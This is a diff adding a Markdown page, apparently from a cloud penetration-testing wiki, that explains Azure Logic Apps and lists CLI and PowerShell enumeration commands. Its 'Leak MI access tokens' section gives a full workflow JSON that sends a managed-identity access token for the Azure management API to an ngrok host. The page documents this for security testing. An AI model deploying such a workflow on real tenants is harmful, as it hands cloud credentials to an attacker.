@@ -1,0 +1,394 @@
+# Az - Logic Apps
+
+## Basic Information
+
+Azure Logic Apps enables developers to **create and run workflows that integrate various services**, data sources, and applications. These workflows are designed to **automate business processes**, orchestrate tasks, and perform data integrations across different platforms.
+
+Logic Apps provides a **visual designer** to create workflows with a **wide range of pre-built connectors**, which makes it easy to connect to and interact with various services:
+
+<img src="../../../images/image (197).png" alt="https://infiniteblogs.blob.core.windows.net/medias/4de7fba4-1d43-465a-8c12-8da966a2cdb3_Overview.png"><figcaption></figcaption>
+
+### Hosting options
+
+There are several hosting options:
+
+* **Consumption**
+    - **Multi-tenant**: This provides shared compute resources, operates in the public cloud, and follows a pay-per-operation pricing model. This is ideal for lightweight and cost-effective workloads. This is what we will call a "Single Workflow".
+* **Standard**
+    - **Workflow Service Plan**: This provides dedicated compute resources with VNET integration for networking and charges per workflow service plan instance. It is suitable for more demanding workloads requiring greater control.
+    - **App Service Environment V3:** This provides dedicated compute resources with full isolation and scalability. It also integrates with VNET for networking and uses a pricing model based on App Service instances within the environment. 
+    - **Hybrid:** This is designed for local processing and multi-cloud support. It allows customer-managed compute resources with local network access and utilizes Kubernetes Event-Driven Autoscaling (KEDA). It relies on a Container App Connected Environment.
+
+## "Single" Workflows / Consumption Plan
+
+A **workflow** is a structured sequence of automated steps or tasks that execute a specific process or objective. It defines how different actions, conditions, and decisions interact to achieve a desired outcome, streamlining operations and reducing manual effort.
+
+> [!TIP]
+> The Consumption plan allows **creating a single workflow without the need of a Logic App** itself. 
+
+### Triggers & Actions
+
+Workflow triggers indicate **when the workflow should start**. Triggers could be an HTTP endpoint, a schedule, or tens of different events from Azure or even external apps.
+
+Each workflow has different **actions**. These actions are the steps that the workflow follows. Depending on the action different parameters will be available to configure it, like:
+
+- **Connection name**: Connection to use that the action will interact with.
+- **Authentication Type:** The different options are Access Key, Microsoft Entra ID, Integrated Service principal authentication and Logic Apps Managed Identity.
+  - From a Read-Only perspective, the **Authentication** data is always interesting as it could contain sensitive information.
+  - From a Write perspective, the **Authentication** data is always interesting as it could allow to use the permissions of the assigned managed identities.
+- ...
+
+Actions also have various **settings**, which depend on the action itself. Some of the most common settings are:
+
+- **Retry Policy**: Configures the number of retries and the interval between them.
+- **Timeout**: Sets the maximum time the action can run before it times out.
+- **Run After**: Specifies the conditions that must be met before the action runs.
+- **Schema Validation**: Ensures incoming data follows a predefined structure.
+- **Networking**: Configures how to manage different headers.
+- **Secure Inputs/Outputs**: This will hide input/output data from the run history.
+- ...
+
+### Authorization Policies
+
+These workflows support **authorization policies** with Entra ID to secure request-based triggers by requiring a valid access token. This token must include specific claims:
+ - Issuer (iss) to verify the identity provider
+ - Audience (aud) to ensure the token is intended for the Logic App 
+ - Subject (sub) to identify the caller
+ - JWT ID (JSON Web Token identifier)
+ - Custom Claim
+
+When a request is received, Logic Apps validates the token against these claims and allows execution only if they match the configured policy. This can be used to allow another tenant to trigger the workflow or deny trigger from other sources, for example just allowing the trigger if comes from https://login.microsoftonline.com/.
+
+### Access Keys
+
+Workflows **generate 2 access keys** when they are created. These keys are used to authenticate and authorize requests to the workflow. The keys are used to generate a Shared Access Signature (SAS) token, which is included in the request URL.
+
+So, when an HTTP endpoint trigger is created, a **unique HTTP endpoint with a SAS signature** that grants permission to call the workflow is generated.
+
+These **keys can be regenerated** and a new SAS URL will be created for these triggers, but the **keys values can not be accessed**.
+
+Example of a SAS URL to invoke a trigger:
+
+```
+https://<region>.logic.azure.com:443/workflows/<workflow-id>/triggers/<trigger-name>/paths/invoke?api-version=<api-version>&sp=%2Ftriggers%2F<trigger-name>%2Frun&sv=<version>&sig=<signature>
+```
+
+### Workflow Settings & Components
+
+- **Trigger access option**: This setting lets you restrict who can trigger or start your workflow. The options are Any IP, Only other workflow and Specific IP ranges.
+- **Integration account**: Link your workflow to an Integration Account.
+- **High throughput**: If on, it allows to handle more requests in parallel quickly. 
+- **Run history retention**: This indicates the number of days to keep run history.
+- **API connections**: This shows the different API connections the workflow has. Inside each of these connections they have different properties and the possibility of edit the API connection where the Authentication type can be changed.
+- **History**: It has the option to access **history** of old executions and get data: Settings, Output, Parameters and the Code.
+- **Versions**: It has the option of accessing different **versions** of the workflow, where you can check the code and change the present workflow with an older version of it.
+- **Managed Identities**: It's possible to assign 1 system managed identity and server user managed identity to the workflow.
+
+### Leak MI access tokens
+
+The HTTP action in a workflow can be used to send data to an external web. In the **Advanced parameters** of the HTTP action, it's possible to configure the **Authentication Type** as **`Managed identity`** and then select the **assigned Managed Identity** to use (system or user).
+
+Moreover, it's possible to indicate in the **`Audience`** the audience of the generated JWT, which could be for example **`https://management.azure.com/`** to be able to use the generated token to access the Azure management API.
+
+> [!WARNING]
+> Making the action send the HTTP request to a server controlled by an attacker it's possible to **leak the access token of the managed identity** assigned to the workflow.
+
+> [!TIP]
+> An attacker could also use other type of actions to **access directly other Azure services** and perform actions with the permissions of the managed identity.
+
+This is the code of a workflow that exposes a HTTP endpoint and then uses a HTTP action to leak the access token to the configured URL (ngrok in this case):
+
+<details>
+<summary>Workflow code</summary>
+```json
+{
+    "definition": {
+        "$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
+        "contentVersion": "1.0.0.0",
+        "triggers": {
+            "When_a_HTTP_request_is_received": {
+                "type": "Request",
+                "kind": "Http"
+            }
+        },
+        "actions": {
+            "HTTP": {
+                "runAfter": {},
+                "type": "Http",
+                "inputs": {
+                    "uri": "https://22b6-81-33-70-107.ngrok-free.app",
+                    "method": "GET",
+                    "authentication": {
+                        "type": "ManagedServiceIdentity",
+                        "audience": "https://management.azure.com/"
+                    }
+                },
+                "runtimeConfiguration": {
+                    "contentTransfer": {
+                        "transferMode": "Chunked"
+                    }
+                }
+            }
+        },
+        "outputs": {},
+        "parameters": {
+            "$connections": {
+                "type": "Object",
+                "defaultValue": {}
+            }
+        }
+    },
+    "parameters": {
+        "$connections": {
+            "type": "Object",
+            "value": {}
+        }
+    }
+}
+```
+
+</details>
+
+## Logic Apps / Standard Plan
+
+### Differences with "Single" Workflows
+
+Logic apps basically use an App Service in the background to **host the logic app which can host several workflows**. This means that the logic app will have all the features of an App Service and of the "Single" Workflows.
+
+Some key features would be:
+
+- **App Service Plan**: Logic Apps in the Standard plan are hosted on an App Service Plan so it's possible to use all the App Service features like:
+  - **Network Restrictions**: Indicate from where it's accessible.
+  - **Deployment Center**: Deploy from external platforms like Github, Bitbucket, Azure Repos, External Git and Local Git.
+  - **FTP access**: It's possible to access the files of the Logic App through FTP.
+  - **Storage Account**: The service app uses an storage account to store information.
+  - **Env variables & App Settings**: It's possible to configure environment variables and app settings (and find sensitive info like access keys to the storage account).
+  - ...
+- **Parameters**: Parameters let you manage values that vary across development, test, and production. This allows you to design workflows first, then easily adjust environment-specific settings later.
+- **Dedicated Resources**: Logic Apps in the Standard plan have dedicated resources.
+- **Multiple Workflows**: It allows to create multiple workflows.
+
+For more info about App Services check:
+
+### Enumeration
+
+{{#tabs }}
+{{#tab name="az cli" }}
+```bash
+# List
+az logic workflow list --resource-group <ResourceGroupName> 
+# Get info
+az logic workflow show --name <LogicAppName> --resource-group <ResourceGroupName> 
+
+# Get details of a specific Logic App workflow, including its connections and parameters
+az rest \
+  --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}?api-version=2016-10-01&$expand=connections.json,parameters.json" \
+  --headers "Content-Type=application/json"
+
+# Get details about triggers for a specific Logic App
+az rest --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers?api-version=2016-06-01"
+
+# Get the callback URL for a specific trigger in a Logic App
+az rest --method POST \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/listCallbackUrl?api-version=2016-06-01"
+
+# Get the history of a specific trigger in a Logic App
+az rest --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{logicAppName}/triggers/{triggerName}/histories?api-version=2016-06-01"
+
+# List all runs of a specific Logic App workflow
+az rest \
+  --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/runs?api-version=2016-06-01" \
+  --headers "Content-Type=application/json"
+
+# Get all actions within a specific run of a Logic App workflow
+az rest \
+  --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/runs/{runName}/actions?api-version=2016-06-01" \
+  --headers "Content-Type=application/json"
+
+# List all versions of a specific Logic App workflow
+az rest \
+  --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/versions?api-version=2016-06-01" \
+  --headers "Content-Type=application/json"
+
+# Get details of a specific version of a Logic App workflow
+az rest \
+  --method GET \
+  --uri "https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Logic/workflows/{workflowName}/versions/{versionName}?api-version=2016-06-01" \
+  --headers "Content-Type=application/json"
+
+# List all Logic Apps in the specified resource group
+az logicapp list --resource-group <ResourceGroupName>
+
+# Show detailed information about a specific Logic App
+az logicapp show --name <LogicAppName> --resource-group <ResourceGroupName>
+
+# List all application settings for a specific Logic App
+az logicapp config appsettings list --name <LogicAppName> --resource-group <ResourceGroupName>
+
+# Get a Parameters from an Azure App Service using Azure REST API
+az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{app-service-name}/hostruntime/admin/vfs/parameters.json?api-version=2018-11-01&relativepath=1"
+
+# Get webhook-triggered workflows from an Azure Logic App using Azure REST API
+az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/hostruntime/runtime/webhooks/workflow/api/management/workflows?api-version=2018-11-01"
+
+# Get workflows from an Azure Logic App using Azure REST API
+az rest --method GET --url "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/workflows?api-version=2018-11-01"
+
+# Get details of a specific workflow including its connections and parameters in Azure Logic Apps using Azure REST API
+az rest --method GET --uri "https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{resource-group-name}/providers/Microsoft.Web/sites/{logic-app-name}/workflows/{workflow-name}?api-version=2018-11-01&\$expand=connections.json,parameters.json"
+
+```
+{{#endtab }}
+
+{{#tab name="Az Powershell" }}
+
+```bash
+Get-Command -Module Az.LogicApp
+
+# List
+Get-AzLogicApp -ResourceGroupName <ResourceGroupName>
+# Get info
+Get-AzLogicApp -ResourceGroupName <ResourceGroupName> -Name <LogicAppName>
+
+# Get details of a specific Logic App workflow run action
+Get-AzLogicAppRunAction -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>" -RunName "<RunName>"
+
+# Get the run history for a specific Logic App
+Get-AzLogicAppRunHistory -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>"
+
+# Get details about triggers for a specific Logic App
+Get-AzLogicAppTrigger -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>"
+
+# Get the callback URL for a specific trigger in a Logic App
+Get-AzLogicAppTriggerCallbackUrl -ResourceGroupName "<ResourceGroupName>" -LName "<LogicAppName>" -TriggerName "<TriggerName>"
+
+# Get the history of a specific trigger in a Logic App
+Get-AzLogicAppTriggerHistory -ResourceGroupName "<ResourceGroupName>" -Name "<LogicAppName>" -TriggerName "<TriggerName>"
+
+```
+{{#endtab }}
+{{#endtabs }}
+
+## Integration Accounts
+**Integration Accounts**, are a feature of Azure Logic Apps. Integration Accounts are used to facilitate enterprise-level integrations by enabling advanced B2B capabilities, such as EDI, AS2, and XML schema management. Integration Accounts are a container in Azure that store the following artifacts used for Logic Apps:
+
+* **Schemas**: Manage XML schemas for validating and processing messages in your integration account.
+* **Maps**: Configure XSLT-based transformations to convert data formats within your integration workflows.
+* **Assemblies**: Manage integration account assemblies to streamline logic and data processing.
+* **Certificates**: Handle certificates for encrypting and signing messages, ensuring secure communication.
+* **Partners**: Manage trading partner information for B2B transactions, enabling seamless integrations.
+* **Agreements**: Configure rules and settings for exchanging data with trading partners (e.g., EDI, AS2).
+* **Batch Configurations**: Manage batch processing configurations to group and process messages efficiently.
+* **RosettaNet PIP**: Configure RosettaNet Partner Interface Processes (PIPs) for standardizing B2B communication.
+
+#### Enumeration
+
+{{#tabs }}
+{{#tab name="az cli" }}
+```bash
+# Integration account
+az logic integration-account list --resource-group <resource-group-name>
+az logic integration-account show --resource-group <resource-group-name> --name <integration-account-name>
+az logic integration-account list-callback-url --resource-group <resource-group-name> --integration-account-name <integration-account-name>
+
+# Batch-configuration
+az logic integration-account batch-configuration list \
+  --resource-group <resource-group-name> \
+  --integration-account-name <integration-account-name>
+
+az logic integration-account batch-configuration show \
+  --resource-group <resource-group-name> \
+  --integration-account-name <integration-account-name> \
+  --batch-configuration-name <batch-configuration-name>
+
+# Map
+az logic integration-account map list \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name>
+
+az logic integration-account map show \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name> \
+  --map-name <map-name>
+
+# Partner
+az logic integration-account partner list \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name>
+
+az logic integration-account partner show \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name> \
+  --name <partner-name>
+
+# Session
+az logic integration-account session list \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name>
+
+az logic integration-account session show \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name> \
+  --name <session-name>
+
+# Assembly
+# Session
+az logic integration-account assembly list \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name>
+
+az logic integration-account assembly show \
+  --resource-group <resource-group-name> \
+  --integration-account <integration-account-name> \
+  --assembly-artifact-name <assembly-name>
+
+```
+{{#endtab }}
+
+{{#tab name="Az Powershell" }}
+```bash
+Get-Command -Module Az.LogicApp
+
+# Retrieve details of an integration account
+Get-AzIntegrationAccount -ResourceGroupName <resource-group-name> -Name <integration-account-name>
+
+# Retrieve the callback URL of an integration account
+Get-AzIntegrationAccountCallbackUrl -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name>
+
+# Retrieve details of a specific agreement in an integration account
+Get-AzIntegrationAccountAgreement -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <agreement-name>
+
+# Retrieve details of a specific assembly in an integration account
+Get-AzIntegrationAccountAssembly -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <assembly-name>
+
+# Retrieve details of a specific batch configuration in an integration account
+Get-AzIntegrationAccountBatchConfiguration -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <batch-configuration-name>
+
+# Retrieve details of a specific certificate in an integration account
+Get-AzIntegrationAccountCertificate -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <certificate-name>
+
+# Retrieve details of a specific map in an integration account
+Get-AzIntegrationAccountMap -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <map-name>
+
+# Retrieve details of a specific partner in an integration account
+Get-AzIntegrationAccountPartner -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <partner-name>
+
+# Retrieve details of a specific schema in an integration account
+Get-AzIntegrationAccountSchema -ResourceGroupName <resource-group-name> -IntegrationAccountName <integration-account-name> -Name <schema-name>
+```
+{{#endtab }}
+{{#endtabs }}
+
+## Privilege Escalation
+
+Same as logic apps privesc:
+
+## Post Exploitation
+
+## Persistence
